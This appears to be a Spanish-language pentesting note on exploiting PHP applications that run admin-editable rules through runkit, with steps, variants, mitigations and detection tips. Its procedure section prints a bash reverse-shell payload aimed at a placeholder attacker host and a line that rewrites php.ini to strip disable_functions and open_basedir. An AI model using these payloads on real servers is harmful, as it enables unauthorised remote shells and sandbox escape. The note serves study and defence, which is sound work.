---
topic: PHP — reglas de usuario ejecutadas con runkit
tags: [web, php, runkit, code-injection, sandbox-escape]
---

# PHP — reglas de usuario ejecutadas con runkit

[🇬🇧 English](php-runkit-rule-injection.en.md) | **Español**

## Concepto

`runkit_function_add` y `runkit_function_redefine` permiten crear o reemplazar funciones PHP en tiempo de ejecución. Una aplicación que guarda reglas en la base de datos y las carga con runkit convierte el panel de administración en ejecución de código. Si además el validador se ejecuta con un `php.ini` que el propio usuario puede escribir, el sandbox desaparece.

## Cuándo aplica

- El panel permite editar reglas, plantillas o fragmentos PHP.
- La aplicación las carga con `runkit_function_add`, `eval` o `create_function`.
- El validador usa un archivo de configuración escribible.

## Procedimiento

1. Confirmar que la regla se evalúa al guardar o al invocar una acción.
2. Inyectar una llamada a `system` o `shell_exec`.
3. Si hay bloqueo, escribir un `php.ini` que elimine `disable_functions`.
4. Ejecutar la regla y obtener la shell.

```php
system('bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"'); return true;
```

```php
file_put_contents('/ruta/php.ini', "engine=On\nopen_basedir=\ndisable_functions=\n");
```

## Variantes

- `assert` con una cadena controlada.
- `preg_replace` con el modificador `/e` en PHP antiguo.
- Reglas Twig o Smarty que permiten funciones peligrosas.

## Limitaciones

- `runkit` no está disponible en PHP 8 sin la extensión.
- `disable_functions` y `open_basedir` limitan la ejecución.
- El archivo de configuración debe ser escribible por el usuario del servicio.

## Mitigación

- No ejecutar código PHP desde la base de datos.
- Usar reglas declarativas y validadores en un contenedor sin privilegios.
- Montar `php.ini` como solo lectura y separar el validador del runtime.

## Detección

- Cambios en reglas seguidas de procesos hijos del servidor web.
- Escrituras en `php.ini` o rutas de configuración.
- Uso de `runkit_function_add` en producción.

## Referencias

- [PHP — runkit_function_add](https://www.php.net/manual/en/function.runkit-function-add.php)
- [0xdf — Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [CWE-94 — Code Injection](https://cwe.mitre.org/data/definitions/94.html)
